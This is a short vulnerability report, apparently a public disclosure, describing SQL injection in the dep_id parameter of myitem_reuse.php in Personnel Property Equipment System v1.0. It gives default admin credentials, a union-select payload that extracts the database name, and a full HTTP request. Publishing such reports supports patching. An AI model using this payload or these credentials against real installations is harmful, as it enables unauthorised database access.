# Personnel Property Equipment System v1.0 by sourcecodester has SQL injection 3

BUG_Author: Zhang Qi

Login account: Jonremus/admin

vendors: https://www.sourcecodester.com/php/11255/personel-property-equipment-system.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /ppes/admin/myitem_reuse.php

Vulnerability location: /ppes/admin/myitem_reuse.php?id=, id

dbname = ppes

[+] Payload: /ppes/admin/myitem_reuse.php?dep_id=-1%27%20union%20select%201,database(),3--+ // Leak place ---> id

```sql
GET /ppes/admin/myitem_reuse.php?dep_id=-1%27%20union%20select%201,database(),3--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=1lo81k0mv3p5cfonn5hopvoht6
Connection: close
```

<img width="1199" height="581" alt="image" src="https://github.com/user-attachments/assets/d0fa3f3f-dc9d-4a56-a940-5a462f979e00" />
